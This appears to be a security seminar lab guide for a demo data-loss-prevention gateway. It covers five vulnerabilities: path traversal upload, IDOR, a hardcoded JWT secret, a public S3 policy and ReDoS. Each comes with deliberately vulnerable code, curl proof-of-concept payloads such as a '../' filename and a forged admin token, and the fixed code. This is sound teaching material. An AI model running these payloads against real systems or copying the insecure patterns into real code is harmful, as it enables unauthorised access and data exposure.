# Security Vulnerabilities, PoC Exploits & Remediations (Seminar Lab)

> **Authorized Demo Scope Only:** All Proof-of-Concept (PoC) exploits below are strictly scoped to your own local or deployed CloudGuard DLP Gateway instance (`$TARGET_URL`, e.g., `http://localhost:8000` or `https://your-demo.ngrok-free.app`). Toggle modes via the UI **Security Seminar Lab** tab or `POST /api/security/mode`.

---

## 1. Path Traversal & Unrestricted File Upload

### (a) Vulnerable Code (`backend/routes/scan.py` when `SECURITY_MODE == "vulnerable"`)
```python
staging_dir = os.path.abspath("temp_uploads")
os.makedirs(staging_dir, exist_ok=True)
# Unsanitized raw filename concatenated directly with os.path.join
unsafe_target = os.path.join(staging_dir, raw_filename)
with open(os.path.abspath(unsafe_target), "wb") as f:
    f.write(file_bytes)
```

### (b) Safe PoC Exploit (Run against your own instance in `vulnerable` mode)
```bash
# 1. Switch to vulnerable mode & login
TOKEN=$(curl -s -X POST "$TARGET_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"demo@dlp-gateway.local","password":"User@12345"}' | python -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST "$TARGET_URL/api/security/mode" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"mode":"vulnerable"}'

# 2. Upload a file with '../' path traversal & disallowed '.exe' extension
echo "traversal-test" > /tmp/payload.txt
curl -s -X POST "$TARGET_URL/api/scan/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/payload.txt;filename=../poc_traversal_escape.txt"
```
**Expected Vulnerable Result:** HTTP `200`, `vulnerability_trace.escaped_staging_dir: true` (file escaped `temp_uploads/`).

### (c) Real-World Impact
Without filename sanitization, extension allow-listing, or payload size limits, an authenticated attacker can supply `../` sequences to overwrite application source code, startup scripts, or `.env` configuration files outside the intended staging directory, potentially escalating directly to Remote Code Execution (RCE) or overwriting gateway policy files, while unvalidated file uploads allow denial-of-service via multi-gigabyte uploads or malicious binary execution.

### (d) Fixed Code (`backend/routes/scan.py` when `SECURITY_MODE == "remediated"`)
```python
if len(file_bytes) > settings.MAX_UPLOAD_SIZE_BYTES:
    raise HTTPException(status_code=413, detail="File exceeds maximum allowed size of 10 MB.")
if ".." in raw_filename or "/" in raw_filename or "\\" in raw_filename:
    raise HTTPException(status_code=400, detail="Invalid filename: path traversal characters are forbidden.")
clean_filename = os.path.basename(raw_filename)
ext = os.path.splitext(clean_filename)[1].lower().strip(".")
if ext not in settings.ALLOWED_EXTENSIONS:
    raise HTTPException(status_code=400, detail=f"Unsupported file type '.{ext}'.")
```

### (e) Re-run PoC in Remediated Mode
Switch mode back to `remediated` (`POST /api/security/mode` with `{"mode":"remediated"}`) and re-run the same `curl` command:
- **Result:** HTTP `400 Bad Request` — `"Invalid filename: path traversal characters are forbidden."` (and `.exe` uploads return HTTP `400` `"Unsupported file type"`).

---

## 2. Broken Access Control / IDOR on Scan Events Endpoint

### (a) Vulnerable Code (`backend/routes/events.py` when `SECURITY_MODE == "vulnerable"`)
```python
@router.get("/events/{event_id}")
async def get_scan_event_detail(event_id: str, current_user: dict = Depends(get_current_user)):
    event = await events_col.find_one({"id": event_id})
    # Missing ownership / RBAC check! Any logged-in user can read any sequential scan ID.
    return {"security_mode": settings.SECURITY_MODE, "event": event}
```

### (b) Safe PoC Exploit
```bash
# Logged in as standard user (demo@dlp-gateway.local), guess admin's sequential scan ID 'scan-1003'
curl -s -X GET "$TARGET_URL/api/events/scan-1003" \
  -H "Authorization: Bearer $DEMO_USER_TOKEN"
```
**Expected Vulnerable Result:** HTTP `200 OK` exposing the Admin's sensitive financial/PII scan findings (`user_email: admin@dlp-gateway.local`) to a standard employee account.

### (c) Real-World Impact
Insecure Direct Object Reference (IDOR) combined with predictable sequential identifiers (`scan-1001`, `scan-1002`) allows any low-privileged employee or external contractor with a valid session to enumerate the entire DLP audit database. Because DLP scan logs contain context snippets, filenames, and metadata about sensitive corporate leaks, this turns the security monitoring system itself into an intelligence-gathering target for data exfiltration.

### (d) Fixed Code (`backend/routes/events.py` when `SECURITY_MODE == "remediated"`)
```python
if settings.SECURITY_MODE != "vulnerable":
    if current_user["role"] != "admin" and event["user_id"] != current_user["id"]:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access Denied (IDOR Prevented): You are not authorized to inspect another user's DLP scan event."
        )
```

### (e) Re-run PoC in Remediated Mode
Re-run `GET /api/events/scan-1003` with `$DEMO_USER_TOKEN` after switching to `remediated` mode:
- **Result:** HTTP `403 Forbidden` — `"Access Denied (IDOR Prevented): You are not authorized to inspect another user's DLP scan event."`

---

## 3. Hardcoded Weak JWT Secret & Missing Token Expiration

### (a) Vulnerable Code (`backend/auth.py` when `SECURITY_MODE == "vulnerable"`)
```python
# Weak dictionary secret + no 'exp' claim (infinite session validity) + blind role trust
payload = {"sub": user_id, "email": email, "role": role, "iat": int(now.timestamp())}
return jwt.encode(payload, "secret123", algorithm="HS256")
```

### (b) Safe PoC Exploit
```bash
# Forge an Admin JWT offline using the weak hardcoded secret 'secret123' with NO expiry
FORGED_ADMIN_JWT=$(python -c "from jose import jwt; print(jwt.encode({'sub':'usr-admin-001','email':'admin@dlp-gateway.local','role':'admin'}, 'secret123', algorithm='HS256'))")

# Access admin-only policy update or dashboard with forged token
curl -s -X GET "$TARGET_URL/api/auth/me" -H "Authorization: Bearer $FORGED_ADMIN_JWT"
```
**Expected Vulnerable Result:** HTTP `200 OK` — Gateway accepts the attacker-forged token and grants full `admin` privileges indefinitely.

### (c) Real-World Impact
Using a short, hardcoded signing key like `"secret123"` allows attackers to crack the HMAC secret offline in milliseconds using tools like `hashcat` or `jwt_tool`, then mint arbitrary tokens impersonating cloud administrators (`role: admin`) to disable DLP blocking policies or download quarantined files. Omitting the `exp` claim further guarantees that any leaked token grants permanent, unexpirable access even after password resets.

### (d) Fixed Code (`backend/auth.py` when `SECURITY_MODE == "remediated"`)
```python
# 256-bit cryptographically random secret + strict 30-min expiration + JTI revocation + DB role lookup
expire = now + timedelta(minutes=settings.JWT_EXPIRE_MINUTES)
payload = {
    "sub": user_id, "email": email, "role": role,
    "jti": str(uuid.uuid4()), "iat": int(now.timestamp()), "exp": int(expire.timestamp())
}
token = jwt.encode(payload, settings.JWT_SECRET_KEY, algorithm="HS256")
# On decode: verify_exp=True, check JTI not in REVOKED_JTIS, and read authoritative role from DB
```

### (e) Re-run PoC in Remediated Mode
Re-run the same `$FORGED_ADMIN_JWT` against `GET /api/auth/me` in `remediated` mode:
- **Result:** HTTP `401 Unauthorized` — `"Invalid or expired authentication token: Signature verification failed."`

---

## 4. Overly Permissive S3 Bucket Policy & Disabled Encryption

### (a) Vulnerable Code (`backend/storage.py` when `SECURITY_MODE == "vulnerable"`)
```python
# Public-read ACL, no Server-Side Encryption, and wildcard Principal '*' bucket policy
bucket_policy = {
    "Statement": [{
        "Sid": "PublicReadGetObject",
        "Effect": "Allow",
        "Principal": "*",
        "Action": ["s3:GetObject", "s3:ListBucket"],
        "Resource": ["arn:aws:s3:::cloudguard-dlp-quarantine-bucket/*"]
    }]
}
```

### (b) Safe PoC Exploit
```bash
curl -s -X GET "$TARGET_URL/api/security/s3-audit" -H "Authorization: Bearer $TOKEN"
```
**Expected Vulnerable Result:** Returns `public_access_block: false`, `default_encryption: "Disabled"`, and `Principal: "*"` on the Quarantine Bucket—exposing sensitive PAN/Card files publicly.

### (c) Real-World Impact
A misconfigured S3 bucket policy with `"Principal": "*"` and `PublicAccessBlock` disabled is one of the leading causes of catastrophic cloud data breaches: automated internet scanners continuously enumerate S3 bucket names and immediately exfiltrate quarantined financial spreadsheets, customer PII, and backups over unencrypted HTTP without needing any AWS credentials.

### (d) Fixed Code (`backend/storage.py` when `SECURITY_MODE == "remediated"`)
```python
# Enforce SSE-S3 AES256, Block Public Access, HTTPS-only condition, and IAM role least-privilege
put_kwargs["ServerSideEncryption"] = "AES256"
bucket_policy = {
    "Statement": [
        {"Sid": "DenyInsecureTransport", "Effect": "Deny", "Principal": "*", "Action": "s3:*",
         "Condition": {"Bool": {"aws:SecureTransport": "false"}}},
        {"Sid": "AllowOnlyDLPGatewayRole", "Effect": "Allow",
         "Principal": {"AWS": "arn:aws:iam::123456789012:role/CloudGuardDLPGatewayRole"},
         "Action": ["s3:PutObject", "s3:GetObject"]}
    ]
}
```

### (e) Re-run PoC in Remediated Mode
Re-run `GET /api/security/s3-audit` in `remediated` mode:
- **Result:** `public_access_block: true`, `default_encryption: "SSE-S3 (AES-256)"`, `DenyInsecureTransport` enabled, and access restricted solely to `CloudGuardDLPGatewayRole`.

---

## 5. ReDoS-Prone Regex in Detection Engine

### (a) Vulnerable Code (`dlp-engine/detectors.py` / `backend/routes/security_demo.py`)
```python
# Nested quantifiers ([...]+)+ cause catastrophic exponential O(2^n) backtracking on non-matching suffixes
vuln_regex = re.compile(r"^([a-zA-Z0-9_.-]+)+@([a-zA-Z0-9_.-]+)+\.([a-zA-Z0-9_.-]+)+$")
```

### (b) Safe PoC Exploit
```bash
# Craft a benign-looking 25-character string lacking '@' that triggers exponential backtracking
curl -s -X POST "$TARGET_URL/api/security/redos-test" \
  -H "Content-Type: application/json" \
  -d '{"payload":"aaaaaaaaaaaaaaaaaaaaaaaa!"}'
```
**Expected Vulnerable Result:** `backtracking_warning: true`, `execution_time_ms` spikes dramatically (hundreds to thousands of milliseconds for just 25 characters; 30+ chars can stall a worker thread for minutes).

### (c) Real-World Impact
Because a pre-storage DLP gateway scans every uploaded document synchronously before persistence, an attacker can upload a tiny 50-byte text file containing nested-quantifier trigger characters to lock 100% of Python worker threads in catastrophic regex backtracking. This induces a complete Application-Layer Denial of Service (ReDoS), halting legitimate uploads across the entire organization with minimal attacker bandwidth.

### (d) Fixed Code (`dlp-engine/detectors.py` / `backend/routes/security_demo.py`)
```python
# Non-nested, length-bounded linear O(n) pattern eliminating backtracking ambiguity
safe_regex = re.compile(r"^[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9.-]{1,128}\.[A-Za-z]{2,10}$")
```

### (e) Re-run PoC in Remediated Mode
Switch to `remediated` mode and re-run the exact same `curl` command:
- **Result:** `backtracking_warning: false`, `execution_time_ms < 0.5 ms` even for 1,000-character inputs.
